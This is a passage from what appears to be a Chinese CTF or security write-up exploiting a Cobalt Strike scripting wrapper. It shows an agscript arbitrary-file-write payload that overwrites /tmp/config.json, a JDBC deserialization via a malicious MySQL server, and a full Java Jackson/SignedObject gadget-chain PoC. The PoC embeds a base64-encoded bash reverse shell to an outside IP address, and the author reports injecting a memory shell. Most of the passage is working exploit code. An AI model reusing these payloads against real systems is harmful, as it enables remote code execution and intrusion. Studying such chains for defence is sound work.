    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"get_listener_info"</span><span class="p">):</span>
        <span class="n">ListenerName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">get_listener_info</span><span class="p">(</span><span class="n">ListenerName</span><span class="p">)</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"create_socks"</span><span class="p">):</span>
        <span class="n">beaconid</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">SocksPort</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">create_socks</span><span class="p">(</span><span class="n">beaconid</span><span class="p">,</span> <span class="n">SocksPort</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ScriptContent</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">run_script</span><span class="p">(</span><span class="n">ScriptContent</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/tmp/result.txt"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">))</span>
    <span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p>跟踪到run_script方法发现就是可控的脚本内容</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">run_script</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">script_content</span><span class="p">):</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"{str(script_content)}"</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
</pre></div>
<p>我们阅读文档的<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#artifact" target="_blank">Functions</a>篇章，可以发现cs是可以利用agscript脚本进行木马生成的， 比如：</p>
<div class="highlight"><pre><span></span><span class="o">$</span>data <span class="o">=</span> artifact<span class="p">(</span><span class="s">"my listener"</span><span class="p">,</span> <span class="s">"exe"</span><span class="p">);</span>

<span class="o">$</span>handle <span class="o">=</span> openf<span class="p">(</span><span class="s">"&gt;out.exe"</span><span class="p">);</span>
writeb<span class="p">(</span><span class="o">$</span>handle<span class="p">,</span> <span class="o">$</span>data<span class="p">);</span>
closef<span class="p">(</span><span class="o">$</span>handle<span class="p">);</span>
</pre></div>
<p>而我们只要把文件名和data值改成自定义值就可以造成一个任意文件写入漏洞，而我们之前看到jdbc连接是通过读文件获取的参数拼接，那么我们便可以利用此漏洞写入<code>/tmp/config.json</code>文件，完全控制url字段。</p>
<h3 data-content="1" id="233a917dee3a84f7cc64b3f04f101943">Jdbc反序列化配合jackson的二次反序列化链</h3>
<p>接下来就可以里打jdbc的反序列化，checkclass中对mysql类的getBytes做了一下waf，其实就是变相的给反序列化ban了俩类，需要打二次反序列化绕过。</p>
<p>看一下maven依赖发现可以打jackson二次反序列化</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241203235548-104520f8-b18f-1.png"/></p>
<h4 data-content="1" id="f08f1a1a420ad0ee4052dec2b7bb57a4">整体思路如下：</h4>
<div class="highlight"><pre><span></span>agscript任意文件写入覆盖<span class="o">/</span>tmp<span class="o">/</span>config.json <span class="o">=&gt;</span> 

自定义config内容触发jdbc反序列化 <span class="o">=&gt;</span> 

自定义恶意mysql服务器打jackson的二次反序列化链
</pre></div>
<p>agscript任意文件写入覆盖/tmp/config.json 的payload如下</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="nt">"type"</span><span class="p">:</span> <span class="s2">"&amp;123"</span><span class="p">,</span>
    <span class="nt">"data"</span><span class="p">:</span> <span class="p">{</span>
        <span class="nt">"ip"</span><span class="p">:</span> <span class="s2">"127.0.0.1"</span><span class="p">,</span>
        <span class="nt">"port"</span><span class="p">:</span> <span class="s2">"50050"</span><span class="p">,</span>
        <span class="nt">"username"</span><span class="p">:</span> <span class="s2">"aaa"</span><span class="p">,</span>
        <span class="nt">"password"</span><span class="p">:</span> <span class="s2">"123456"</span><span class="p">,</span>
        <span class="nt">"ListenerName"</span><span class="p">:</span> <span class="s2">"test"</span><span class="p">,</span>
        <span class="nt">"ScriptContent"</span><span class="p">:</span> <span class="s2">"$data = \"{'ip':'ip','port':'3306','dbname':'test?maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true&amp;detectCustomCollations=true&amp;autoDeserialize=true'}\";$handle = openf(\"&gt;/tmp/config.json\");writeb($handle,$data);closef($handle);"</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>注意：写入的agscript脚本内容需要符合json格式不然不会被读取</p>
<p>访问/connect/doScript触发jdbc反序列化</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241203235520-ffd47b9c-b18e-1.png"/></p>
<p>接下来是恶意mysql服务器打jackson的二次反序列化链</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">javassist.*</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>  

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SignedObjectBAVEPoC</span>  
<span class="o">{</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>  
        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>  
        <span class="n">CtClass</span> <span class="n">ctClass0</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="o">);</span>  
        <span class="n">CtMethod</span> <span class="n">writeReplace</span> <span class="o">=</span> <span class="n">ctClass0</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"writeReplace"</span><span class="o">);</span>  
        <span class="n">ctClass0</span><span class="o">.</span><span class="na">removeMethod</span><span class="o">(</span><span class="n">writeReplace</span><span class="o">);</span>  
        <span class="n">ctClass0</span><span class="o">.</span><span class="na">toClass</span><span class="o">();</span>  

        <span class="n">ClassPool</span> <span class="n">pool2</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>  
        <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">pool2</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"a"</span><span class="o">);</span>  
        <span class="n">CtClass</span> <span class="n">superClass</span> <span class="o">=</span> <span class="n">pool2</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>  
        <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superClass</span><span class="o">);</span>  
        <span class="n">CtConstructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CtConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">CtClass</span><span class="o">[]{},</span><span class="n">ctClass</span><span class="o">);</span>  
        <span class="n">constructor</span><span class="o">.</span><span class="na">setBody</span><span class="o">(</span><span class="s">"Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAgIC1jICAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjM3LjE3My84OTk5IDA+JjEn}|{base64,-d}|{bash,-i}\");"</span><span class="o">);</span>  
        <span class="n">ctClass</span><span class="o">.</span><span class="na">addConstructor</span><span class="o">(</span><span class="n">constructor</span><span class="o">);</span>  
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>  
        <span class="n">TemplatesImpl</span> <span class="n">templatesImpl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>  
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>  
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"bbb"</span><span class="o">);</span>  
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>  

        <span class="n">POJONode</span> <span class="n">jsonNodes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">);</span>  
        <span class="n">BadAttributeValueExpException</span> <span class="n">exp</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>  
        <span class="n">Field</span> <span class="n">val</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.management.BadAttributeValueExpException"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"val"</span><span class="o">);</span>  
        <span class="n">val</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">exp</span><span class="o">,</span><span class="n">jsonNodes</span><span class="o">);</span>  
        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>  
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>  
        <span class="c1">//二次反序列化  </span>
        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>  
        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>  
        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>  
        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">exp</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>  



        <span class="n">POJONode</span> <span class="n">node</span> <span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="o">(</span><span class="n">signedObject</span><span class="o">);</span>  
        <span class="n">BadAttributeValueExpException</span> <span class="n">val2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>  

        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">val2</span><span class="o">,</span> <span class="s">"val"</span><span class="o">,</span> <span class="n">node</span><span class="o">);</span>  
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">serialize</span><span class="o">(</span><span class="n">val2</span><span class="o">)));</span>  

    <span class="o">}</span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>  
    <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>  
    <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>  
    <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>  
    <span class="k">return</span> <span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();}</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">field</span><span class="o">,</span> <span class="n">Object</span> <span class="n">val</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>  
        <span class="n">Field</span> <span class="n">dField</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>  
        <span class="n">dField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="n">dField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">val</span><span class="o">);</span>  
    <span class="o">}</span>  

<span class="o">}</span>
</pre></div>
<p>成功打入内存马</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241203235501-f4959e5a-b18e-1.png"/></p>
</div>
</div>